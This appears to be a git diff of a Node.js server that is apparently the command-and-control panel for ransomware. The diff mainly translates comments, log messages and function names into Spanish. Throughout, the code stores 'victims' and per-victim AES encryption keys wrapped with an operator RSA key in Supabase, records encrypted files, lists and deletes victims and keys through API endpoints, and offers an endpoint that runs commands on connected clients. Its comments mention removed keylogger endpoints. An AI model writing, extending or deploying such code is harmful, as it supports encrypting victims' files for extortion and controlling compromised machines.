@@ -7,23 +7,23 @@ const fs = require('fs');
 const crypto = require('crypto');
 const readline = require('readline');
 
-// Load environment variables
+// Cargar variables de entorno
 require('dotenv').config();
 
-// Supabase client
+// Cliente de Supabase
 const { createClient } = require('@supabase/supabase-js');
 const supabase = process.env.SUPABASE_URL && process.env.SUPABASE_KEY
   ? createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY)
   : null;
 
-// Log Supabase connection status at startup
+// Registrar estado de conexion de Supabase al iniciar
 if (supabase) {
   console.log('[Supabase] Connected to:', process.env.SUPABASE_URL);
 } else {
   console.log('[Supabase] NOT CONFIGURED - Set SUPABASE_URL and SUPABASE_KEY in environment');
 }
 
-// Global RL interface
+// Interfaz RL global
 global.rl = null;
 
 const app = express();
@@ -36,7 +36,7 @@ const io = new Server(server, {
 });
 
 // Helper para loguear y enviar a dashboards
-function logServer(msg, type = 'info') {
+function logServidor(msg, type = 'info') {
   // Auto-detectar tipo basado en contenido textual (sin iconos)
   const lower = msg.toLowerCase();
   if (lower.includes('error') || lower.includes('fallo') || lower.includes('desconectado') || lower.includes('apagado')) type = 'error';
@@ -72,16 +72,16 @@ if (!fs.existsSync(KEYS_DIR)) {
 }
 
 // ===============================
-// DATABASE PERSISTENCE (Supabase)
+// PERSISTENCIA EN BASE DE DATOS (Supabase)
 // ===============================
 
-// Save victim to database
-async function saveVictim(data) {
+// Guardar victima en base de datos
+async function guardarVictima(data) {
   if (!supabase) {
-    console.log('[Supabase] saveVictim skipped - no client');
+    console.log('[Supabase] guardarVictima omitido - sin cliente');
     return;
   }
-  console.log('[Supabase] Saving victim:', data.uuid, data.hostname);
+  console.log('[Supabase] Guardando victima:', data.uuid, data.hostname);
   try {
     const { error } = await supabase.from('victims').upsert({
       uuid: data.uuid,
@@ -96,23 +96,23 @@ async function saveVictim(data) {
     if (error) {
       console.log(`[DB Error] victims: ${error.message}`);
     } else {
-      console.log('[Supabase] Victim saved successfully:', data.hostname);
+      console.log('[Supabase] Victima guardada exitosamente:', data.hostname);
     }
   } catch (e) {
     console.log(`[DB Failed] victims: ${e.message}`);
   }
 }
 
-// Save encryption key to database
-async function saveKey(data) {
+// Guardar clave de cifrado en base de datos
+async function guardarClave(data) {
   if (!supabase) {
-    console.log('[Supabase] saveKey skipped - no client');
+    console.log('[Supabase] guardarClave omitido - sin cliente');
     return;
   }
-  console.log(`[Supabase] Saving key for: ${data.hostname} | UUID: ${data.uuid} | AES: ${data.aes_key ? 'YES' : 'NULL'} | RSA-Enc: ${data.encrypted_aes_key ? 'YES' : 'NULL'}`);
+  console.log(`[Supabase] Guardando clave para: ${data.hostname} | UUID: ${data.uuid} | AES: ${data.aes_key ? 'SI' : 'NULO'} | RSA-Enc: ${data.encrypted_aes_key ? 'SI' : 'NULO'}`);
 
   try {
-    // Check if key already exists for this UUID
+    // Verificar si la clave ya existe para este UUID
     const { data: existing, error: selectError } = await supabase
       .from('keys')
       .select('id')
@@ -120,13 +120,13 @@ async function saveKey(data) {
       .limit(1)
       .single();
 
-    if (selectError && selectError.code !== 'PGRST116') { // PGRST116 = no rows found
+    if (selectError && selectError.code !== 'PGRST116') { // PGRST116 = no se encontraron filas
       console.error(`[DB Error] keys select: ${selectError.message}`);
       return;
     }
 
     if (existing) {
-      // Update existing row
+      // Actualizar fila existente
       const { error: updateError } = await supabase
         .from('keys')
         .update({
@@ -139,10 +139,10 @@ async function saveKey(data) {
       if (updateError) {
         console.error(`[DB Error] keys update: ${updateError.message}`);
       } else {
-        console.log(`[Supabase] Key UPDATED successfully for ${data.hostname}`);
+        console.log(`[Supabase] Clave ACTUALIZADA exitosamente para ${data.hostname}`);
       }
     } else {
-      // Insert new row
+      // Insertar nueva fila
       const { error: insertError } = await supabase
         .from('keys')
         .insert({
@@ -155,7 +155,7 @@ async function saveKey(data) {
       if (insertError) {
         console.error(`[DB Error] keys insert: ${insertError.message}`);
       } else {
-        console.log(`[Supabase] Key INSERTED successfully for ${data.hostname}`);
+        console.log(`[Supabase] Clave INSERTADA exitosamente para ${data.hostname}`);
       }
     }
   } catch (e) {
@@ -163,13 +163,13 @@ async function saveKey(data) {
   }
 }
 
-// Save encrypted file to database
-async function saveEncryptedFile(data) {
+// Guardar archivo cifrado en base de datos
+async function guardarArchivoCifrado(data) {
   if (!supabase) {
-    console.log('[Supabase] saveEncryptedFile skipped - no client');
+    console.log('[Supabase] guardarArchivoCifrado omitido - sin cliente');
     return;
   }
-  console.log('[Supabase] Saving encrypted file:', data.archivo);
+  console.log('[Supabase] Guardando archivo cifrado:', data.archivo);
   try {
     const { error } = await supabase.from('encrypted_files').insert({
       uuid: data.uuid,
@@ -183,28 +183,28 @@ async function saveEncryptedFile(data) {
     if (error) {
       console.error(`[DB Error] encrypted insert: ${error.message} - Data:`, JSON.stringify(data));
     } else {
-      console.log(`[Supabase] Encrypted file metadata saved: ${data.archivo}`);
+      console.log(`[Supabase] Metadatos de archivo cifrado guardados: ${data.archivo}`);
     }
   } catch (e) {
     console.error(`[DB Exception] encrypted: ${e.message}`);
   }
 }
 
-// Update victim status
-async function updateVictimStatus(uuid, status) {
+// Actualizar estado de victima
+async function actualizarEstadoVictima(uuid, status) {
   if (!supabase) return;
   try {
     await supabase.from('victims').update({ status }).eq('uuid', uuid);
   } catch (e) {
-    console.log(`[DB Failed] update status: ${e.message}`);
+    console.log(`[DB Fallo] actualizar estado: ${e.message}`);
   }
 }
 
-// Legacy sync function (redirects to new functions)
-async function syncToCloud(type, payload) {
-  if (type === 'Victims') return saveVictim(payload);
-  if (type === 'Keys') return saveKey(payload);
-  if (type === 'Encrypted') return saveEncryptedFile(payload);
+// Funcion legacy de sincronizacion (redirige a nuevas funciones)
+async function sincronizarNube(type, payload) {
+  if (type === 'Victims') return guardarVictima(payload);
+  if (type === 'Keys') return guardarClave(payload);
+  if (type === 'Encrypted') return guardarArchivoCifrado(payload);
 }
 
 // ===============================
@@ -230,7 +230,7 @@ function generarClavesRSA() {
     rsaPublicKey = publicKey;
     fs.writeFileSync(RSA_PRIVATE_PATH, privateKey);
     fs.writeFileSync(RSA_PUBLIC_PATH, publicKey);
-    logServer(' Nuevas claves RSA generadas y guardadas');
+    logServidor(' Nuevas claves RSA generadas y guardadas');
   }
 }
 
@@ -270,7 +270,7 @@ function descifrarAES(encryptedHex, claveHex, ivHex) {
 generarClavesRSA();
 
 function generarClaveCliente(clienteId, clienteName = null) {
-  // Ensure keys directory exists
+  // Asegurar que el directorio de claves exista
   if (!fs.existsSync(KEYS_DIR)) {
     fs.mkdirSync(KEYS_DIR, { recursive: true });
   }
@@ -278,7 +278,7 @@ function generarClaveCliente(clienteId, clienteName = null) {
   const key = crypto.randomBytes(32).toString('hex'); // 256 bits en hex
   const safeName = (clienteName || clienteId).replace(/[^a-zA-Z0-9_-]/g, '_');
 
-  // Encrypt with RSA Public Key for storage/proof
+  // Cifrar con clave publica RSA para almacenamiento/prueba
   let encryptedKey = '';
   try {
     if (rsaPublicKey) {
@@ -292,7 +292,7 @@ function generarClaveCliente(clienteId, clienteName = null) {
       encryptedKey = buffer.toString('base64');
     }
   } catch (e) {
-    console.log('Error encrypting AES key for storage:', e.message);
+    console.log('Error cifrando clave AES para almacenamiento:', e.message);
   }
 
   // Guardar localmente
@@ -309,12 +309,12 @@ function generarClaveCliente(clienteId, clienteName = null) {
 async function obtenerClaveCliente(clienteId, clienteName = null, uuid = null) {
   if (clavesPorCliente.has(clienteId)) return clavesPorCliente.get(clienteId);
 
-  // 1. Try Supabase first (Deduplication)
+  // 1. Intentar Supabase primero (Deduplicacion)
   if (supabase) {
     try {
       let query = supabase.from('keys').select('aes_key');
 
-      // Prioritize identifying by UUID if available, then hostname
+      // Priorizar identificacion por UUID si esta disponible, luego hostname
       if (uuid) {
         query = query.eq('uuid', uuid);
       } else if (clienteName) {
@@ -328,7 +328,7 @@ async function obtenerClaveCliente(clienteId, clienteName = null, uuid = null) {
         if (data && data.aes_key) {
           console.log(`[Supabase] Clave recuperada de la nube para: ${clienteName || uuid}`);
           clavesPorCliente.set(clienteId, data.aes_key);
-          // Optional: Restore local file if missing could be added here
+          // Opcional: Restaurar archivo local si falta podria agregarse aqui
           return data.aes_key;
         }
       }
@@ -337,7 +337,7 @@ async function obtenerClaveCliente(clienteId, clienteName = null, uuid = null) {
     }
   }
 
-  // 2. Try Local File
+  // 2. Intentar archivo local
   const safeName = (clienteName || clienteId).replace(/[^a-zA-Z0-9_-]/g, '_');
   const filePath = path.join(KEYS_DIR, `${safeName}_key.txt`);
 
@@ -353,7 +353,7 @@ async function obtenerClaveCliente(clienteId, clienteName = null, uuid = null) {
       if (matchEnc) {
         encryptedKey = matchEnc[1];
       } else {
-        // Backfill: Encrypt existing key
+        // Rellenar: Cifrar clave existente
         try {
           if (rsaPublicKey) {
             const buffer = crypto.publicEncrypt(
@@ -371,17 +371,17 @@ async function obtenerClaveCliente(clienteId, clienteName = null, uuid = null) {
             console.log(`[Backfill] Clave cifrada generada y guardada para: ${safeName}`);
           }
         } catch (e) {
-          console.log('Error encrypting existing AES key:', e.message);
+          console.log('Error cifrando clave AES existente:', e.message);
         }
       }
 
       clavesPorCliente.set(clienteId, key);
       console.log(` Clave recuperada localmente para: ${clienteName || clienteId}`);
 
-      // FORCE SYNC TO CLOUD (Correcting the missing data issue)
+      // FORZAR SINCRONIZACION A LA NUBE (Corrigiendo problema de datos faltantes)
       if (uuid) {
-        // Debug logging added
-        console.log(`[Supabase] Saving key for UUID: ${uuid} | AES: ${key ? 'YES' : 'NULL'} | RSA-Enc: ${encryptedKey ? 'YES' : 'NULL'}`);
+        // Logging de depuracion agregado
+        console.log(`[Supabase] Guardando clave para UUID: ${uuid} | AES: ${key ? 'SI' : 'NULO'} | RSA-Enc: ${encryptedKey ? 'SI' : 'NULO'}`);
         try {
           const { error } = await supabase
             .from('keys')
@@ -396,7 +396,7 @@ async function obtenerClaveCliente(clienteId, clienteName = null, uuid = null) {
           if (error) {
             console.error(`[DB Error] Keys Upsert: ${error.message}`);
           } else {
-            console.log(`[Supabase] Key synced successfully for ${clienteName}`);
+            console.log(`[Supabase] Clave sincronizada exitosamente para ${clienteName}`);
           }
         } catch (e) {
           console.error(`[DB Exception] Keys: ${e.message}`);
@@ -407,13 +407,13 @@ async function obtenerClaveCliente(clienteId, clienteName = null, uuid = null) {
     }
   }
 
-  // 3. Generate New
+  // 3. Generar nueva
   const newKeys = generarClaveCliente(clienteId, clienteName);
-  const key = newKeys.key; // Extract plain key
+  const key = newKeys.key; // Extraer clave plana
 
-  // Save to cloud immediately if UUID is available
+  // Guardar en la nube inmediatamente si UUID esta disponible
   if (uuid) {
-    saveKey({
+    guardarClave({
       uuid: uuid,
       hostname: clienteName,
       aes_key: key,
@@ -467,7 +467,7 @@ app.post('/api/ejecutar', async (req, res) => {
     });
   }
 
-  logServer(`Ejecutando comando: ${comando}`);
+  logServidor(`Ejecutando comando: ${comando}`);
 
   try {
     const resultado = await ejecutarComando(comando);
@@ -496,10 +496,10 @@ app.get('/api/status', (req, res) => {
 });
 
 // ===============================
-// DATABASE QUERY ENDPOINTS
+// ENDPOINTS DE CONSULTA DE BASE DE DATOS
 // ===============================
 
-// Get all victims from database
+// Obtener todas las victimas de la base de datos
 app.get('/api/db/victims', async (req, res) => {
   if (!supabase) {
     return res.json({ success: false, error: 'Supabase not configured', data: [] });
@@ -517,7 +517,7 @@ app.get('/api/db/victims', async (req, res) => {
   }
 });
 
-// Get all keys from database
+// Obtener todas las claves de la base de datos
 app.get('/api/db/keys', async (req, res) => {
   if (!supabase) {
     return res.json({ success: false, error: 'Supabase not configured', data: [] });
@@ -535,7 +535,7 @@ app.get('/api/db/keys', async (req, res) => {
   }
 });
 
-// Get all encrypted files from database
+// Obtener todos los archivos cifrados de la base de datos
 app.get('/api/db/encrypted', async (req, res) => {
   if (!supabase) {
     return res.json({ success: false, error: 'Supabase not configured', data: [] });
@@ -553,8 +553,8 @@ app.get('/api/db/encrypted', async (req, res) => {
   }
 });
 
-// Get stats summary
-// API Endpoint para obtener claves RSA
+// Obtener resumen de estadisticas
+// Endpoint API para obtener claves RSA
 app.get('/api/rsa-keys', (req, res) => {
   res.json({
     success: true,
@@ -563,7 +563,7 @@ app.get('/api/rsa-keys', (req, res) => {
   });
 });
 
-// Update key in database
+// Actualizar clave en base de datos
 app.post('/api/db/keys/update', async (req, res) => {
   if (!supabase) {
     return res.status(500).json({ success: false, message: 'Supabase not configured' });
@@ -586,7 +586,7 @@ app.post('/api/db/keys/update', async (req, res) => {
   }
 });
 
-// Delete key from database
+// Eliminar clave de base de datos
 app.post('/api/db/keys/delete', async (req, res) => {
   if (!supabase) {
     return res.status(500).json({ success: false, message: 'Supabase not configured' });
@@ -609,7 +609,7 @@ app.post('/api/db/keys/delete', async (req, res) => {
   }
 });
 
-// Delete victim from database (cascades to keys and encrypted_files)
+// Eliminar victima de base de datos (cascada a claves y archivos cifrados)
 app.post('/api/db/victims/delete', async (req, res) => {
   if (!supabase) {
     return res.status(500).json({ success: false, message: 'Supabase not configured' });
@@ -620,7 +620,7 @@ app.post('/api/db/victims/delete', async (req, res) => {
       return res.status(400).json({ success: false, message: 'UUID required' });
     }
 
-    // Delete in order: encrypted_files -> keys -> victims (respecting FK constraints)
+    // Eliminar en orden: encrypted_files -> keys -> victims (respetando restricciones FK)
     await supabase.from('encrypted_files').delete().eq('uuid', uuid);
     await supabase.from('keys').delete().eq('uuid', uuid);
 
@@ -631,7 +631,7 @@ app.post('/api/db/victims/delete', async (req, res) => {
 
     if (error) throw error;
 
-    logServer(`Víctima eliminada de DB: ${uuid}`);
+    logServidor(`Victima eliminada de DB: ${uuid}`);
     res.json({ success: true });
   } catch (e) {
     res.status(500).json({ success: false, message: e.message });
@@ -649,7 +649,7 @@ app.get('/api/db/stats', async (req, res) => {
       supabase.from('encrypted_files').select('*', { count: 'exact', head: true })
     ]);
 
-    // Debug any errors
+    // Depurar cualquier error
     if (victimsResult.error) console.error('[Stats Error] Victims:', victimsResult.error.message);
     if (keysResult.error) console.error('[Stats Error] Keys:', keysResult.error.message);
     if (encryptedResult.error) console.error('[Stats Error] Encrypted:', encryptedResult.error.message);
@@ -678,12 +678,12 @@ app.post('/api/shutdown', (req, res) => {
 });
 
 // ===============================
-// SECURITY API ENDPOINTS
+// ENDPOINTS API DE SEGURIDAD
 // ===============================
 
-// Keylogger endpoints removed
+// Endpoints de keylogger eliminados
 
-// Security and File Manager endpoints removed
+// Endpoints de seguridad y gestor de archivos eliminados
 
 // Ruta GET para obtener lista de clientes conectados
 app.get('/api/clientes', (req, res) => {
@@ -693,7 +693,7 @@ app.get('/api/clientes', (req, res) => {
   });
 });
 
-// File list endpoint removed
+// Endpoint de lista de archivos eliminado
 
 // Obtener clave y último IV del cliente
 app.get('/api/cliente-clave/:clienteId', async (req, res) => {
